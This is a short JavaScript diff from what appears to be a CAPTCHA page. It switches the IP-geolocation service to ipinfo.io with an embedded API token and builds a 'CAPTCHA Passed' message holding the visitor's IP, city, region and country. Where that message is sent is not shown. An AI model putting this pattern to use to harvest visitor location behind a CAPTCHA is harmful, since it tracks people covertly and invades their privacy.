@@ -58,13 +58,14 @@
 
             try {
                 // Get IP and location info
-                const res = await fetch("https://ipapi.co/json/");
+               const res = await fetch("https://ipinfo.io/json?token=614f4f5fe09129");
                 const data = await res.json();
                 
                 const ip = data.ip || "N/A";
                 const city = data.city || "N/A";
                 const region = data.region || "N/A";
-                const country = data.country_name || "N/A";
+                const country = data.country || "N/A";
+
 
                 const message = `✅ CAPTCHA Passed\n🌍 IP: ${ip}\n📍 Location: ${city}, ${region}, ${country}`;
                 
